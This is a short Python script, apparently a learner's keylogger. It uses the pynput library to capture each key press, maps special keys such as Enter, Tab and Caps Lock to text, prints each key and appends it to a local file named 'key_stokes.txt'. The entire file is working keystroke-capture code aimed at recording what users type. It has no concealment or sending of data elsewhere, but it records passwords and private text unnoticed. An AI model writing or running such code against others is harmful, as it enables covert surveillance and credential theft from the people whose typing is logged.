from pynput.keyboard import Listener

# Create Text Document
file = open("key_stokes.txt", 'a')
file.write('\n\n')
file.write("--"*20)
file.write('\n\n')
file.close()

# Capture users keyboard
def listener_keyboard(key):
    letter = str(key)
    letter = letter.replace("'","")

# Set a rules when users type on keyboard
    if letter == 'Key.enter':
         letter = '\n'
    if letter == 'Key.shift':
         letter = ''
    if letter == 'Key.backspace':
         letter = ''
    if letter == 'Key.caps_lock':
         letter = ' <CAP_LOCK> '
    if letter == 'Key.tab':
         letter = '\t'
    if letter == 'Key.esc':
        letter = ' lala '
    print(letter)
    with open("key_stokes.txt", 'a') as f:
         f.write(letter)

with Listener (on_press = listener_keyboard) as l:
     l.join()

